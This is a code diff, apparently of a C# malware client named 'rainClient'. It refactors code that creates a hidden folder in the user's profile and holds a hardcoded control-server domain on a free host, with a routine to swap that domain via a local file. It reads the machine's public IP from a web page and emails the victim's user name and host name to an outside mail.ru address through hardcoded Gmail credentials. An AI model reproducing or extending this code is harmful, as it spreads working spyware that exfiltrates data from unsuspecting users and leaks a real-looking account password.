@@ -22,29 +22,22 @@ namespace rainClient
         [DllImport("user32.dll")]
         public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
 
-        public static string puth = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\UserProfile\winZip";
-        public static string defaultDomain = "http://ganter-001-site1.etempurl.com";
+        public static string puth = String.Format("{0}\\UserProfile\\winZip", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
+        public static string defaultDomain = <domain>"http://ganter-001-site1.etempurl.com"</domain>;
         private static object locker = new object();
 
         static GO()
         {
-            string pputh = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\UserProfile\winZip";
+            string pputh = String.Format("{0}\\UserProfile\\winZip", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
             Directory.CreateDirectory(pputh);
         }
 
-        //"http://ganter-001-site1.etempurl.com" без паттерна
-        //"https://www.whatismyip.org" с паттерном "<a href=\"/my-ip-address\">(.*)</a></h3>"
         public static string parceIP(string webSite, string pattern = null)
         {
             try
             {
                 Stream stream = new WebClient().OpenRead(webSite);
                 StreamReader sr = new StreamReader(stream);
-                void closeProcessing()
-                {
-                    stream.Close();
-                    sr.Close();
-                }
                 string str;
                 string newLine;
                 Regex regex = pattern == null ? new Regex("<myIP>(.*)</myIP>") : new Regex(pattern);
@@ -54,29 +47,19 @@ namespace rainClient
                     str = match.Groups[1].ToString();
                     if (str != "")
                     {
-                        closeProcessing();
+                        stream.Close();
+                        sr.Close();
                         return str;
                     }
                 }
-                closeProcessing();
+                stream.Close();
+                sr.Close();
             }
             catch
             {}
             return null;
         }
-
-        public static void sendMail(string message) =>         
-            new SmtpClient("smtp.gmail.com", 587)
-            {
-                Credentials = new NetworkCredential("server1crow@gmail.com", "warface0073"),
-                EnableSsl = true
-            }.Send(new MailMessage(new MailAddress("server1crow@gmail.com", "Naruto"), new MailAddress("4el0073@mail.ru"))
-            {
-                Subject = "Hi",
-                Body = $"<h2>UserName {Environment.UserName} </h2><h2>HostName {Dns.GetHostName()}</h2><h2>Message {message}</h2>",
-                IsBodyHtml = true
-            }); 
-        
+           
         public static void writeNewDomein(string domein)
         {
             if (File.Exists(puth + "\\chcpcd.bin"))
@@ -102,5 +85,19 @@ namespace rainClient
             }
             return defaultDomain;
         }     
+
+        public static void sendMail(string message)
+        {            
+            new SmtpClient("smtp.gmail.com", 587)
+            {
+                Credentials = new NetworkCredential("server1crow@gmail.com", "warface0073"),
+                EnableSsl = true
+            }.Send(new MailMessage(new MailAddress("server1crow@gmail.com", "Naruto"), new MailAddress("4el0073@mail.ru"))
+            {
+                Subject = "Hi",
+                Body = String.Format("<h2>UserName {0} </h2><h2>HostName {1}</h2><h2>Message {2}</h2>", Environment.UserName, Dns.GetHostName(), message),
+                IsBodyHtml = true
+            }); 
+        }
     }
 }
